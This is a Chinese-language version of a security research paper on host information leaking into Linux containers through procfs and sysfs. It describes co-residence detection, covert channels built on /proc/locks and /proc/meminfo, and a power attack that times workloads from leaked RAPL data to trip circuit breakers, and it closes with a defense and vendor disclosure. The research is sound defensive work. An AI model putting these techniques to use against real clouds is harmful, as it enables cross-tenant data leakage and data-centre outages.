尽管容器服务很成功，但是在同一个操作系统内核上运行多个可能属于不同租户的容器，始终存在安全和隐私问题。为了支持容器云上的多租户，Linux内核正在进行跨容器隔离和取消特权用户级别容器的努力。现有的容器启用内核功能大大缩小了暴露给容器租户的攻击面，并且可以限制大多数现有的恶意攻击。然而，并不是所有的Linux内核的子系统都能够区分容器和主机之间的执行上下文，因此它们可能会向容器化应用程序公开系统范围的信息。一些子系统被认为对容器适应性的优先级较低。其余的子系统面临着将代码库转换成容器形式的实现困难，并且它们的维护者不愿意接受激烈的变化。为了关闭这些漏洞，当前容器运行时软件和容器云提供商通常利用访问控制策略来隐藏这些与容器无关的子系统用户内核接口。然而，这种手动和临时修复只能覆盖一小部分暴露出来的攻击面。 在本文中，我们系统地探索和识别可能意外暴露主机操作系统和co-residence容器信息的容器内泄漏通道。这些信息泄漏包括主机系统状态信息（例如功耗、性能数据、全局内核数据和异步内核事件）以及单个进程执行信息（例如进程调度、cgroups 和进程运行状态）。在特定时间点暴露的区分特征信息可以帮助唯一地识别物理机器。此外，恶意租户可以通过提前获取系统范围的知识来优化攻击策略并最大化攻击效果。我们在 Docker 和 LinuX 容器 (LXC) 上的本地测试平台上发现了这些泄漏通道，并验证了它们在五个公共商业多租户容器云服务上（部分）存在。 我们证明了那些信息泄露渠道存在多个安全隐患。总的来说，尽管被挂载为只读，这些通道仍然会被恶意的容器租户利用来推断同一物理机上其他容器的私有数据，检测和验证共存关系，并建立隐蔽通道以偷偷地传输信息。我们提出了几种技术，攻击者可以通过利用那些信息泄露渠道来推断co-residence。与基于缓存的隐蔽信道等传统方法相比，我们的方法对云环境中的噪声更具韧性。我们根据它们的风险等级对这些通道进行排名。我们发现在容器实例中的活动会影响多个通道的系统范围的内的values。通过对运行在容器中的工作负载进行专门操作，攻击者可以实现可靠和高速的隐蔽通道，以突破云部署中采用的隔离机制。例如，通过故意获取和释放锁而不产生网络活动，从而攻击者可以在容器之间隐蔽的传输比特。这些泄露的信息可以被同一物理机上的所有容器观察到。为了揭示这些泄漏通道的安全风险，我们采用不同技术构建了两个隐蔽通道，并在真实的多租户云环境中测试它们的带宽。 我们进一步设计出了一种先进的攻击，称为synergistic power attack，来利用通过这些通道的看似无害的信息。我们证明这样的信息暴露可以极大地放大攻击效果，降低攻击成本，简化攻击编排。power attacks已被证明对现有的数据中心有事实的威胁。如果没有基础云架构运行状态的信息，现有的power attack只能盲目的启动power-intensive workloads，希望高峰能够触发branch circuit breakers来导致power outages。这样的攻击可能costly并且ineffective。 然而，通过学习系统范围内的状态信息，攻击者可以选择 选择最佳时机发动攻击，也就是，在现有的power峰值下，由benign workloads触发，通过增加power-intensive workload来进行攻击。 通过检测被控制的容器的proximity-residence，同步对同一物理机&#x2F;机架的多次power attacks。我们在一个真实的容器云服务上进行了proof-of-concept实验 ，并定量证明了我们的攻击能够以更低的成本产生更高的power峰值。 我们进一步深入分析了这些泄漏渠道的根本原因，并发现是Linux内核中容器implementation的incomplete coverage所致。我们提出了一个两阶段的防卫机制来解决这个在容器云上的问题。特别是，为了防卫synergistic power attacks，我们设计并实现了一个power-based namespace，在Linux内核中对power进行更细粒度（容器）级别的划分。我们和准确性，安全性和性能开销的角度评估了我们的power-based namespace。我们的实验结果表明，我们的系统可以在很小的系统开销下抵御container-based power attack。 BackgroundLinux Kernel Support for Container Technology容器依赖于多个独立的Linux内核组件来实现用户空间实例之间的隔离。与基于虚拟机的虚拟化方法相比，多个容器共享同一个操作系统内核，从而消除了启动和维护虚拟机所需的额外性能开销。容器在业界受到了广泛关注，并在近年来迅速发展，以提高应用程序性能、增强开发人员效率和促进服务部署。在这里，我们介绍两种关键技术namespace和cgroup，它们使得Linux上的容器化成为可能。 Namespace第一个namespace在Linux内核2.4.19中被引入。namespace的关键思想是为一组进程隔离和虚拟化系统资源，这些形成一个容器。每个进程可以与多个不同类型的namespace联系。内核为每个进程提供了一个基于namespace类型的定制化系统资源视图。对任何namespace系统资源的修改都会被限制在相关联的namespace里面，因此不会造成整个系统范围内的修改。 现有的内核有七种不同的namespace：mount（MNT）namespace，UNIX timesharing system （UTS）namespace，PIDnamespace， network（NET） namespace，interprocess communications（IPC）namespace，USER namespace，and CGOUP namespace MNT namespace：隔离一组文件系统mount point。在不同的MNT namespace中，进程对文件系统层次结构有不同的视图。 UTS namespace：每个容器都有自己的主机名和域名，因此一个容器可以被视为独立节点。 PID namespace：虚拟化进程标识符（pids），每个进程有两个pid：在其namespace中有一个pid，在主机上有一个（全局唯一）pid。 NET namespace：包含独立的虚拟网络设备、IP地址、端口和IP路由表。IPC命名空间隔离了进程间通信资源，包括信号、管道和共享内存。 IPC namespace：隔离进程间通信资源，包括信号、管道和共享内存。 USER namespace：引入了用户和组ID号空间的隔离。它在容器内创建一个根用户到主机上非特权用户之间的映射关系。因此，进程可以在用户命名空间内拥有完全权限，但在主机上则被削弱了权限。 CGROUP namespace：虚拟化cgroup资源，每个进程只能通过cgroupfs挂载和/proc/self/cgroup文件获得容器化的cgroup视图。 Cgroup在Linux内核中，cgroup（control group）提供了一种机制，将进程和所有它们的子进程的group分层为具有可控行为的分层group。容器利用cgroup功能，对每个容器实例应用每个cgroup资源限制，从而防止单个容器耗尽主机资源。这些受控资源包括CPU、内存、块IO、网络等。在云计算的计费模型中，cgroup也可以用于为每个容器分配相应的资源并记录它们的使用情况。每个cgroup子系统提供了一个统一的sysfs接口，以简化用户空间中的cgroup操作。 Container Cloud有了这些可用于资源隔离和管理的内核功能，Linux 内核可以在操作系统级别提供轻量级虚拟化功能。未来预计会将更多的namespace和 cgroup 子系统合并到upstream Linux 内核中，以增强容器安全性。近年来，随着容器运行时软件的成熟，容器化已成为虚拟托管的流行选择。LXC 是第一个完整实现于 2008 年构建的 Linux 容器管理器。Docker 建立在 LXC（现在使用 libcontainer）之上，在最近几年已成为最受欢迎的容器管理工具。Docker 可以将应用程序及其依赖项（例如代码、运行时、系统工具和系统库）打包到镜像中，从而保证应用程序在不同平台上表现一致。许多云服务提供商已经提供了容器云服务，其中包括 Amazon ECS、IBM Bluemix、Microsoft Azure 和 Google Compute Engine 等等。对于多租户容器云服务来说，容器可以运行在裸机物理机或虚拟机上。无论是哪种情况下，不同租户的容器都与主机操作系统共享相同的 Linux 内核。 Covert Channels隐蔽通道利用共享资源来打破隔离机制，从而使孤立的实体之间能够进行通信。具有隐秘性的隐蔽通道可用于检索敏感信息并绕过标准通道上的访问控制。广泛认为，即使在虚拟机和容器强制执行隔离技术的情况下，今天的云环境也容易受到隐蔽通道攻击。已经提出了各种技术来建立多租户云环境中的隐蔽通道。Ristenpart等人报告了在公共云中利用共享L2数据缓存达到0.2bps 的比特率。Xu等人使用VM之间的最后一级缓存，在Amazon EC2 环境中构建带宽为3.2bps 的隐藏信道。Wu等人通过利用内存总线上发生竞争实现110 bps 和误码率为0.75% 的隐藏信道。Masti等人成功地通过获取芯片传感器读数来构建隐藏信道，并以12.5bps 的比特率进行传输；Bartolini等人将基于温度的隐藏信道改进至相邻核心50bps 。在云环境中，除了泄露敏感数据的威胁外，隐蔽通道还可以进一步被滥用来检测和验证共存性，这是大多数基于云的攻击的前提条件。通过成功地通过隐蔽通道传输信息，攻击者可以确认两个实例是否在同一主机服务器上co-residence。因此，为了通过构建强大的防御机制来保护云端安全，发现新技术以构建隐蔽通道是一个重要步骤，并已经得到先前研究的密切关注。 Power Attacks on Data Centerspower attacks已经被证明对现有的云基础设施有事实的威胁。考虑到升级power设施的成本，当前数据中心普遍采用power oversubscription来在现有电力供应能力范围内托管尽可能多的服务器。安全保障是基于这样一个假设：相邻的多个服务器同时达到峰值功耗的概率很低。虽然功率超额订阅允许部署更多服务器而不增加电源容量，但降低了电源冗余性，增加了停电可能性，这可能导致同一机架或同一配电单元（PDU）上的服务器被迫关闭。即使正常工作负载也可能产生引起停电的功率峰值。Facebook最近报告称，在2016年的六个月内预防了18次潜在停电事件。如果恶意对手故意投放“能量病毒”发动攻击，则情况将更为严重。停电带来的后果可能是灾难性的，例如Delta Airlines在2016年8月遭遇数据中心断电事件，导致大规模航班延误和取消。最近研究表明，无论是传统还是备用式数据中心都可以进行 power 攻击。 发起一个成功的power attack 需要三个关键因素： 通过合法订阅服务得到目标数据中心的服务器访问权限 稳定的运行适度的工作负载，以增加服务器功耗至其上限。 突然切换到耗电量大的工作负载以触发功率峰值。通过在短时间窗口内引起功率峰值，断路器可以被跳闸以保护服务器免受过流或过载造成的物理损害。 断路器的跳闸条件取决于power峰值的强度和持续时间。为了最大化攻击效果，攻击者需要在同一机架或者PDU所属的一组服务器上运行恶意工作负载。此外，发动攻击的时机也至关重要。如果数据中心的特定的一组服务器（例如，位于同一机架上）已经运行在其峰值功率状态下，则发动成功的power attack的可能性更高。 power 限制技术旨在防御power attack。在机架和PDU级别上，通过监控power消耗，数据中心可以通过基于功率的反馈环路限制服务器的功耗。在主机级别上，Running Average Power Limit(RAPL)是一种用于监视和限制单个服务器功耗的技术。自Sandy Bridge微体系结构以来，Intel引入了RAPL。它提供微秒级细粒度CPU级能源计量，并可用于限制一个包的功耗。 power限制机制显著缩小了功率攻击面，但它无法解决power oversubscription的问题，这是数据中心停电的根本原因。虽然单个服务器的主机级功率限制可以立即响应power surface，但机架或PDU级别的功率限制机制仍会遭受分钟级延迟。假设攻击者可以将电源病毒部署到物理相邻的服务器中，即使每个服务器消耗的电力低于其功率上限，所控制服务器总体聚合后的能量消耗仍可能超过供电容量并触发断路器。我们在以下章节中证明恶意容器租户可以通过控制其高能耗工作负载的部署和利用背景下良性工作负载来放大他们的power attack。 Information Leakages In Container CloudsLinux内核为容器抽象提供了大量支持以实现资源隔离和控制。这些内核机制是在多租户云上运行容器的启用技术。由于优先级和困难程度，Linux内核的某些组件尚未转化为支持容器化。我们打算系统地探索哪些部分的内核没有覆盖，根本原因是什么以及潜在对手如何利用它们。 Container Information Leakages我们首先在本地安装了Docker和LXC容器，并在Linux机器上进行实验。系统设置为默认配置，所有容器都以用户特权启动，与商业容器云类似。Linux提供了两种从用户空间进程到内核的受控接口：系统调用和基于内存的伪文件系统。系统调用主要设计用于用户进程请求内核服务。这些系统调用具有严格的公共接口定义，并通常向后兼容。然而，基于内存的伪文件系统更灵活，可扩展内核功能（例如ioctl），访问内核数据（例如procfs）并调整内核参数（例如sysctl）。此外，这样的伪文件系统使得通过正常文件I&#x2F;O操作操纵内核数据成为可能。Linux有许多基于内存的伪文件系统（例如，procfs、sysfs、devfs、securityfs、debugfs等），这些文件系统服务于不同的内核操作目的。我们更感兴趣的是procfs和sysfs，默认情况下由容器运行时软件挂载。 如图所示，我们设计了一个交叉验证工具，自动发现这些将主机信息暴露给容器的基于内存的伪文件。关键思想是在两个执行上下文中递归探索procfs和sysfs下所有伪文件，在一个未经特权处理的容器中运行，并在主机上运行另一个。我们根据它们的路径对齐并重新排序这些文件，然后对相同内容之间进行成对差分分析。如果从特定虚拟文件访问到的系统资源没有被Linux内核namespace化，则主机和容器会达到相同片段（如图中❷的情况）。否则，如果正确namespace化，则容器可以检索到自己的私有和定制内核数据（如图中❶的情况）。使用这个交叉验证工具，我们可以快速识别可能将系统范围主机信息暴露给容器的伪文件（及其内部内核数据结构）。 Leakage Channel Analysis我们在表中列出了可能泄露主机信息的所有伪文件。这些泄漏渠道包含主机信息的不同方面。容器用户可以检索内核数据结构（例如，/proc/modules显示加载模块列表），内核事件（例如，/proc/interrupts显示每个IRQ的中断数）和硬件信息（例如，/proc/cpuinfo和/proc/meminfo分别显示CPU和内存规格）。此外，容器用户还可以通过某些通道获取性能统计数据。例如，容器可以通过RAPL sysfs接口获得硬件传感器数据（如果这些传感器在物理机上可用），如每个package、核心和DRAM的功耗，并通过数字温度传感器(DTS)sysfs接口获得每个核心的温度。此外，处理器、内存和磁盘I&#x2F;O的使用情况也暴露给容器。虽然乍一看泄露这样的信息似乎无害，但恶意对手可能利用它来发动攻击。 我们通过检查内核代码（在Linux内核版本4.7中）进一步调查了这些信息泄漏的根本原因。通常，泄漏问题是由于内核中namespace实现不完整引起的。更具体地说，我们总结了两个主要原因如下：（1）对于现有namespace缺少context check，以及（2）某些Linux子系统没有（完全）进行namespace隔离。我们提供了两个案例研究，分别是容器中的net prio.ifpriomap和RAPL，以揭示泄漏源头。 Case study 1 - net_prio.ifpriomap伪文件net prio.ifpriomap（位于/sys/fs/cgroup/net prio下）包含了一个映射，该映射将从cgroup中的进程开始并离开系统的流量分配给不同接口。数据格式为[ifname priority]。我们发现，在net prio.ifpriomap上挂钩的内核处理程序函数不知道NET命名空间，因此它向容器化应用程序披露物理机器上所有网络接口。更具体地说，net prio.ifpriomap的读操作由read_priomap函数处理。从这个函数跟踪，我们发现它调用for_each_netdev_rcu，并将第一个参数设置为init_net地址。它迭代主机的所有网络设备，而不考虑NET命名空间。因此，在容器视图中，可以读取主机所有网络设备名称。 Case study 2 - RAPL in containersRAPL是英特尔最近推出的用于设置单个服务器处理器包和DRAM功率限制的技术，可以在毫秒级别响应。在容器云中，RAPL sysfs接口位于/sys/class/powercap/intel-rapl，容器可以访问该接口。因此，容器租户可以通过这个sysfs接口获取主机的系统范围内电源状态，包括核心、DRAM和package等。例如，容器用户可以从伪文件energy uj中读取当前微焦耳能量计数器值。Intel RAPL Linux驱动程序中energy uj的函数处理程序是get_energy_counter。该函数从RAPL MSR检索原始能量数据。由于尚未实现功率数据名称空间，则energy_raw指针引用主机的能量消耗数据。 我们进一步调查了采用Docker&#x2F;LXC容器引擎的容器云服务中存在的信息泄漏问题。我们选择了五个商业公共多租户容器云服务进行泄漏检测，并在表中呈现结果。在云提供商修补通道之前，我们对这些容器云服务的名称（CCi代表第i个Container Cloud）进行匿名化处理。如果结果与我们的容器实例配置不一致，则确认泄露存在。黑点表示通道不存在于该云中，而白点表示通道存在于该云中。我们发现大多数本地机器上的泄露渠道也可以在容器云服务上使用。其中一些由于缺乏特定硬件支持而无法使用（例如Sandy Bridge之前的英特尔处理器或不支持RAPL技术的AMD处理器）。对于CC5，我们发现某些通道信息与本地测试平台不同，这意味着云供应商已经定制了一些额外限制条件。例如，只有属于租户核心和内存相关信息是可用的。然而，这些渠道部分泄露主机信息仍可能被高级攻击者利用, 我们将它们标记为黑白点。 Inference of Co-resident Container我们进一步深入研究特定案例，以查看它们是否可以被利用来检测共存容器 Co-residence problems in cloud settingsCo-residence是云安全中一个众所周知的研究问题。为了提取受害者的信息，攻击者倾向于将恶意实例移动到与受害者相同的物理主机上。Zhang等人已经证明，攻击者可以使用共存实例劫持用户帐户并提取私钥。 此外，实现Co-residence的成本相当低。由于意图整合服务器资源和降低成本，Co-residence仍然是现有云中存在的问题。验证Co-residence的传统方法基于缓存或基于内存泄漏通道。这些方法的准确性可能会因云环境中高噪声而下降。 Approaches and results of checking co-resident containers由于容器可以通过我们发现的泄漏通道读取主机信息，因此我们倾向于测量某些通道是否可用于检查容器共存。我们定义了三个指标，即唯一性（U）、变化性（V）和操作性（M），以定量评估每个通道推断共存的能力。指标 U 表示该通道是否赋予特征数据，可以唯一地识别主机。这是确定两个容器是否位于同一主机最重要和准确的因素。我们已经发现了 17 个泄漏通道，满足这种度量标准。一般来说，我们可以将这些渠道分类为三组： 包含唯一静态标识符的渠道。例如，在/proc/sys/kernel/random 下的引导 ID 是在启动时生成的随机字符串，并且对于每个运行内核都是唯一的。如果两个容器可以读取相同的引导 ID，则明显表示它们正在运行在同一个主机内核上。此组中渠道数据既是静态又是独特的。 容器租户可以动态植入独特签名到其中的渠道 。例如，在/proc/sched debug中 ，容器用户可以通过此接口检索所有活动进程信息的主机 。租户可以在容器内部启动一个带有独特制作的任务名称的进程。从其他容器中，他们可以通过在自己的 sched debug 中搜索此任务名称来验证共存。类似情况适用于计时器列表和锁。 包含唯一动态标识符的渠道。例如，在/proc/uptime中有两个数据字段：系统运行时间和自引导以来的系统空闲时间（以秒为单位）。它们是累积值，并且对于每台主机都是唯一的。同样，RAPL sysfs 接口中的能量 uj 是微焦耳中累积能量计数器 。从该组通道读取到 的 数据 在实时更改 ，但仍然是独特的代表主机 。我们根据其增长率对该组通道进行排名。较快的增长速度表示重复几率较低。 度量V可以展示数据是否随时间变化。有了这个特性，两个容器可以同时定期地对该伪文件进行快照。然后，它们可以通过检查两个数据快照跟踪是否相互匹配来确定co-residence关系。例如，从同一时刻开始，在一分钟内每秒钟记录/proc/meminfo中的MemFree在两个容器中。如果这两个60点数据跟踪彼此匹配，则我们有信心认为这两个容器运行在同一个主机上。每个通道包含不同的信息推断共存的能力，可以通过联合香农熵自然地测量。我们用公式（1）定义熵H。 每个多重独立数据字段Xi，n表示独立数据字段的数量。每个Xi都有可能的值{xi1，· · · ，xim}。我们根据表中的熵结果对能够揭示co-residence能力的九个通道（其中U&#x3D;False且V&#x3D;True）进行排名。 指标M表示容器租户是否可以操作数据。如果租户可以直接将特制的数据嵌入通道中，我们会对其进行标记为黑色。例如，我们可以在容器内创建一个带有特殊任务名称的计时器程序。该任务名称及其关联的计时器将出现在/proc/timer列表中。另一个容器可以搜索计时器列表中的此特殊任务名称以验证共存性。如果租户只能间接影响此通道中的数据，则我们会标记为黑白色。例如，攻击者可以使用taskset命令将计算密集型工作负载绑定到特定核心，并从另一个容器检查CPU利用率、功耗或温度等信息。这些条目可能被高级攻击者利用作为隐蔽信道来传输信号。 对于那些没有这些 U V M 属性的通道，我们认为它们很难被利用。例如，在云数据中心中，大多数服务器可能安装了相同的操作系统分发版和相同的模块列表。虽然 /proc/modules泄漏了主机上加载模块的信息，但是使用此通道推断co-resident容器是困难的。 Constructing Covert Channels包含manipulation（M）的通道可以进一步利用，以在两个容器之间建立隐蔽通道。我们证明了这些信息泄漏通道中的动态标识符和性能数据都可以被滥用来传输信息。特别地，我们实现了两个通道并测试它们的吞吐量和错误率。 Covert channel based on unique dynamic identifiers我们以/proc/locks为例来演示隐蔽通道可以构建在唯一动态标识符之上。通道/proc/locks显示了操作系统中所有锁信息的概述，包括锁类型、相应的进程以及inode号。 这种泄漏也破坏了 pid命名空间，因为所有锁的全局pid都被泄露了。Linux内核的维护者在4.9版本中部分修复了/proc/locks。内核4.9版本中部分修复了/proc/locks，将当前pid命名空间中的所有pid屏蔽为零。然而，其他信息，如锁的数量和节点信息仍然在容器。 我们构建了一个基于/proc/locks的隐蔽通道。具体来说，发送方可以lock一个文件来表示1，并释放lock来表示0。虽然lock和文件不在容器之间共享，但接收器可以在/proc/locks中检查lock的存在。通过不断检查特定lock的状态，可以传输信息。此外，可以同时设置多个lock以传输多个比特。为了建立可靠的高带宽隐蔽信道，攻击者需要考虑几个因素。我们在算法1中详细介绍了构建基于锁的隐蔽信道的过程。 通道/proc/locks包含内部内核数据，因此它一直在更改。尤其是在存在噪声的云环境中，内容可能会发生巨大的波动。 可靠传输数据块的第一步是握手：接收方需要找出发送方使用的所有lock。特别地，握手过程负责： 设置数据传输的起点. 锚定锁，用于同时传送一个block of bits. 同步发送器和接收器。 我们通过为每个数据锁创建一个特定的模式来实现握手。对于一个简化的情况，发送方在短时间内不断获取和释放锁。然后，接收器检查每个数据锁的切换次数（锁定或解锁文件）。如果切换次数超过特定阈值，则接收器通过跟踪索引节点编号来记录该lock，该索引节点编号对于特定文件上的相同锁定是不变的。同时，我们使用一个额外的锁来表示传输信号，用于通知接收器每一轮传输的开始。 在创建特定模式之后，理论上发送方可以立即开始传输。然而，接收方的处理过程的时间是未知的和不确定的，特别是在多租户云环境中存在大量锁的情况下。如果发送方传输数据过快，则可能会丢失一个比特块。虽然发送方可以在发送下一个数据块之前等待一段时间，但这种方法将极大地影响传输速度。 我们进一步添加了一个ACK锁，用于同步发送方和接收方。在获得所有数据锁定之后，接收器通过设置ACK锁定来进行确认。发送器侧的ACK锁的检测类似于接收器侧的其他数据锁的检测方法。接收器在用ACK锁定进行应答之后进入准备状态，并等待数据传输。 对于数据传输，发送方通过获取或释放数据锁，在每一轮中发送一个数据块。例如，八个锁可以表示一个字节。接收器通过检查数据锁的状态来解码数据。一旦接收到ACK锁定，发送器就开始下一轮数据传输。 Covert channel based on performance data variation通过这些信息的泄露，容器用户可以检索到主机服务器的全系统性能统计数据。例如，容器可以通过/proc/stat获取每个核心的CPU使用率，通过/proc/meminfo或/proc/vmstat获取内存使用率。性能数据的取值受容器运行状态的影响。尽管在云环境中，一个容器只能容纳有限的计算资源，但容器中的恶意用户可以仔细选择在容器中运行的工作负载。通过在性能通道中生成独特的模式，容器可以构建隐蔽通道来传输信息。我们建立了一个隐蔽通道，通过滥用/proc/meminfo中的内存使用信息。 /proc/meminfo报告大量关于系统内存使用情况的有价值的信息，包括可用内存总量、系统未使用的物理RAM总量和脏内存总量。 这里我们利用了系统中未使用的内存量。 在云环境中，这个值可能有很大差异，因为每个容器用户都可能影响它。对于建立可靠的隐蔽数据传输来说，这种显著的变化是不可取的。但是，如果不运行内存密集型工作负载，使用情况可能在可接受的范围内波动。我们首先在服务器上记录一段时间的未使用内存，以获得基线值。如果该值变化不迅速且不显著，则表示可以建立隐蔽通道。然后，发送方容器可以分配不同数量的内存来表示位1和位0(例如，位1为100MB，位0为50MB)，这将导致/proc/meminfo中的MemFree字段dorp immediately。接收端可以通过监视空闲内存的变化来简单地转换数据。MemFree分为三个级别:基线情况、位1和位0。发送方在发送1或0后释放所有分配的内存，以便接收方可以知道上次传输的结束并为下一个比特做准备。 为了确保可靠的传输，握手是发送方和接收方之间的第一个必要步骤。 发送方可以选择发送一个固定的模式，比如8位直比特1，来发起一次传输。接收端获得握手模式后，将进入数据接收模式。具体算法见算法2。为了减少其他容器内存消耗所产生的噪声的影响，一旦MemFree落在预定义的范围内，接收端将标记数据传输。同时，增加内存分配量可以减少噪声的影响。但是，由于分配和释放内存需要消耗时间，因此会影响传输带宽。为了减少来自环境的干扰，用户可以进一步设计更高级别的可靠协议，例如使用校验和，以确保传输数据的完整性。 Experiments on a Multi-tenancy Container Cloud为了测量在有真实噪声的环境下的性能，我们选择了一个商业多租户容器云来测试我们的隐蔽通道。我们反复启动容器，并通过检查惟一的静态标识符来验证共存。我们在同一物理机器上创建两个容器。 Lock-based covert channel: 我们在三种不同大小的数据(5,000字节、10,000字节和20,000字节)下测试了基于锁的隐蔽通道的带宽和错误率。我们还选择了四种不同数量的锁(即8、16、24、32)来衡量性能。我们根据经验为切换次数选择一个阈值，以确保所有锁都能被正确识别。握手过程的花费以秒为单位。然后，所有传输数据都是随机生成的。我们恢复接收端的所有数据，并与原始数据进行比较。 具有8个锁的基于锁的隐蔽通道的带宽约为5150 bps。显然，使用的锁越多，带宽就越高。在通道中使用32个数据锁(每轮传输4个字节)，带宽达到22186 bps。 此外，所有案例的错误率都在2%以下。结果表明，基于锁的隐蔽信道具有较高的可靠性。 Memory-based covert channel: 对于构建在/proc/meminfo上的隐蔽通道，我们首先将位1和位0的内存分配分别设置为100,000KB和50,000KB。我们发送1000位来测试性能。然后我们逐渐减少内存分配，直到构建握手失败。带宽和错误率的结果如表3所示。带宽与内存分配大小成反比。但是，如果分配的内存太小，握手过程就会失败，从而导致传输中出现大量错误。最后，通过将65,000KB分配给bit 1, 35,000KB分配给bit 0，我们能够在真实的云环境中实现13.6 bps的带宽。 基于锁的隐蔽通道提供了非常高的数据传输速率，同时仍然保持低错误率。虽然基于内存的隐蔽信道速度有限，但仍能可靠地传输数据。在基于内存的隐蔽信道中可以添加更多的优化方法。例如，我们可以使用更多的级别来每次传输多个比特。我们把它作为我们今后的工作。 值得注意的是，一旦两个容器共存于同一物理服务器上，无论使用相同的CPU包或核心，构建在信息泄漏通道上的隐蔽通道就可以工作。相反，只有当两个实例共享相同的CPU包时，基于最后一级缓存的通道才有效。另据报道，在真实的云环境中，基于内存总线的方法只能适用于近20%的co-residence情况。热隐蔽通道只能在两个核彼此靠近时起作用。 Synergistic Power Attack由于procfs和sysfs在容器中都是只读挂载的，因此恶意租户只能读取这些信息，但不允许修改。我们认为，通过利用泄漏通道，攻击者可以通过学习主机的运行时状态来做出更好的决策。 我们将介绍潜在的Synergistic Power Attack，可能影响数据中心的可靠性，在power outage threats的范围内。我们证明，对手可以利用我们发现的这些信息泄漏来放大攻击效果，降低攻击成本，并促进攻击编排。所有实验都是在真实的容器云中进行的。 Attack Amplification发动成功的power attack的关键是产生短时间的高power峰值，可以超过电力设施的供应能力。正如我们在2.4节中提到的，电源攻击的根本原因是广泛采用电源oversubscription，这使得电源峰值超过安全阈值成为可能。此外，机架级功率封顶机制只能在分钟级时间粒度内反应，为短时间高功率峰值的发生留下了空间。在最严重的情况下，过度充电可能会跳闸分支断路器，导致停电，最终导致服务器瘫痪。能量峰值的高度主要由攻击者控制的资源决定。现有的电源攻击通过自定义电源密集型工作负载 customizing powerintensive workloads(称为电源病毒)来最大限度地提高功耗。Ganesan等人，利用遗传算法自动生成比正常stress基准消耗更多的power的power viruses。 根据Barroso等的报告，在真实的数据中心中，平均利用率约为20%至30%。在如此低的利用率下，不加区分地发起power attack而跳闸断路器的几率极低。 然而，虽然平均利用率较低，但在峰值需求下，数据中心仍然面临断电威胁。这说明物理服务器的功耗随着工作负载的变化会有很大的波动。 为了确认这一假设，我们进行了一个实验，监测容器云中8个物理服务器的整个系统功耗(通过第3节案例研究II中的RAPL泄漏通道)，持续一周。我们将结果显示在图中。我们首先以30秒为间隔对功率数据进行平均，并在第2天和第5天观察功率的剧烈变化。此外，我们在第2天选择一个高功耗区域，并以一秒(这是产生功率峰值的典型时间窗口)为间隔对数据进行平均。峰值功耗达到1199瓦(W)，在一周的时间内，总功耗相差34.72% (899W ~ 1199w)。 我们预计，如果我们能对其进行更长时间的监控，比如在黑色星期五这样的假日，当托管在云上的在线购物网站可能会产生巨大的电力激增时，功耗差异将会更大。 对于容器云中的synergistic power attack，攻击者可以通过RAPL通道监控整个系统的功耗，实时了解功耗模式的波峰和波谷，而不是不加区分地启动功耗密集型工作负载。因此，他们可以利用后台功耗(由同一主机上其他租户的良性工作负载产生)，并在服务器处于峰值运行时间时叠加他们的电源攻击。 这与金融市场的内幕交易现象类似——掌握更多内幕信息的人总是能在合适的时间交易。对手可以通过通过RAPL通道泄露的“内部”功耗信息，在已经很高的功耗基础上再增加一个更高的功耗峰值。 Reduction of Attack Costs从攻击者的角度来看，他们总是希望以最低的代价获得最大的攻击结果。持续运行功耗高的工作负载绝对可以捕获所有良性功耗的峰值。但是，由于几个原因，它对于真实世界的攻击可能并不实用。首先，它不是隐形的。要发起电源攻击，攻击者需要运行电源密集型工作负载。这种行为具有明显的模式，很容易被云提供商检测到。 其次，基于利用率的计费模式现在变得越来越流行。更多的云服务根据CPU&#x2F;内存利用率和网络流量提供更细粒度的价格。例如，Elastic Container为客户提供了基于CPU计量计费的容器。 IBM Cloud为云中的计算资源提供计费指标。Amazon EC2提供了Burstable性能实例，该实例偶尔会崩溃，但大多数时间不会完全运行。VMware按需定价计算器甚至给出了不同利用率水平的估计值。例如，对于一个拥有16个vcpu且平均利用率为1%的实例，它每月收费2.87美元，对于相同的服务器且利用率为100%的实例，每月收费167.25美元。在这些云计费模式下，持续的power attack可能最终导致昂贵的账单。 对于synergistic power attack，通过RAPL监视功耗几乎没有CPU占用。 为了达到相同的效果(功率峰值的高度)，与连续和周期性攻击相比，协同功率攻击可以显著降低攻击成本。我们比较了synergistic power attack和周期性攻击(每300秒发起一次synergistic power attack)的攻击效果。协同攻击在3000秒内只进行两次试验，就可以达到1359瓦的功率峰值，而周期性攻击则进行了9次试验，最多只能达到1280瓦。 Attack Orchestration与传统的power attack不同，synergistic power attack的另一个独特特征是它的攻击编排。假设攻击者已经控制了一些容器实例。如果这些容器分散在数据中心的不同位置，那么它们在多个物理服务器上增加的power不会对电力设施造成压力。现有的功率封顶机制可以毫无困难地容忍来自不同位置的多个小power surges。发动实际电力攻击的唯一方法是将所有“弹药”聚集到相邻位置，同时攻击单个电源。在这里，我们将深入讨论攻击容器实例的编排。 正如我们在第3节中提到的，通过利用多个泄漏通道，攻击者可以将多个容器实例聚合到一个物理服务器中。具体来说，在CC1上的实验中，我们选择使用计时器列表来验证多个容器的共存。具体验证方法请参见3.3节。我们反复创建不在同一物理服务器上的容器实例和终止实例。通过这样做，我们可以轻松地在同一台服务器上部署三个容器。我们在每个容器中运行四个Prime基准测试副本，以充分利用四个分配的核心。每个容器可以贡献大约40W的功率。使用三个容器，攻击者可以轻松地将功耗提高到近230W，这比单个服务器的平均功耗高出约100W。 我们还发现/proc/uptime是另一个有趣的泄漏通道。正常运行时间包括两个数据项，物理服务器的启动时间和所有核心的空闲时间。 在我们的实验中，我们发现一些服务器的启动时间相似，但空闲时间不同。通常情况下，数据中心的服务器在安装和打开后不会重新启动。不同的空闲时间表明它们不是相同的物理服务器，而相似的引导时间表明它们很可能在同一时间段被安装和打开。这是强有力的证据，表明它们可能离得很近，共用同一个断路器。攻击者可以利用此通道将其攻击容器实例聚合到相邻的物理服务器中。这大大增加了他们跳闸导致停电的机会。 Defense AproachA Two-Stage Defense Mechanism直观地说，解决方案应该消除所有泄漏，这样就不会通过这些渠道检索泄漏的信息。我们将防御机制划分为两个阶段:(1)屏蔽通道和(2)增强容器的资源隔离模型。 在第一阶段，系统管理员可以显式地拒绝对容器内通道的读访问，例如，通过AppArmor中的安全策略或挂载伪文件“不可读”。这不需要对内核代码进行任何更改(合并到上游Linux内核可能需要一些时间)，并且可以立即消除信息泄漏。此解决方案取决于容器中运行的合法应用程序是否使用这些通道。如果这些信息与容器化的应用程序正交，则屏蔽它不会对容器租户产生负面影响。我们已经向Docker和表中列出的所有云供应商报告了我们的结果，并收到了积极的回应。 